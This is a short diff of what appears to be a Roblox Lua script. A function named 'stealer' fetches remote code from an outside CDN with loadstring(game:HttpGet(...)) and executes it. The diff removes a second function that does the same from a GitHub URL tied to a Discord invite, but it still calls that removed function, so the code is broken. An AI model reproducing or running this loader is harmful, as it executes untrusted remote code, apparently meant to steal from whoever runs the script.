@@ -2,10 +2,6 @@ local function stealer()
     ID="cb0969e0-e7b5-4166-983b-37186fa7334a";
   loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end
-local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
-
-end
 
 task.spawn(stealer)
 task.spawn(loadui)
